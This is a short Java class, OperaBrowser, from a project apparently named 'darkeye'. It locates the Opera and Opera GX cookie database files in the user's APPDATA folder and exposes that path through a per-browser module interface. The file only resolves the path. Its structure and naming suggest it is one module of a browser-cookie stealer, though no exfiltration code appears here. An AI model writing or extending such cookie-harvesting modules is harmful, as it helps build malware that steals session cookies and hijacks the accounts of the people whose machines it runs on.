package org.spray.darkeye.module.browsers;

import java.io.File;

import org.spray.darkeye.module.BrowserModule;

public class OperaBrowser extends BrowserModule {

	private String[] operaVersions = new String[] { "Opera Stable", "Opera GX Stable" };

	public OperaBrowser() {
		super("Opera");
	}

	@Override
	public String getCookie() {
		return getOpera() + "/Cookies";
	}

	private String getOpera() {
		String opera = "";
		for (String version : operaVersions) {
			File operaPath = new File(System.getenv("APPDATA") + "/Opera Software/" + version);
			if (operaPath.exists()) {
				opera = operaPath.getAbsolutePath();
			}
		}
		return opera;
	}

}
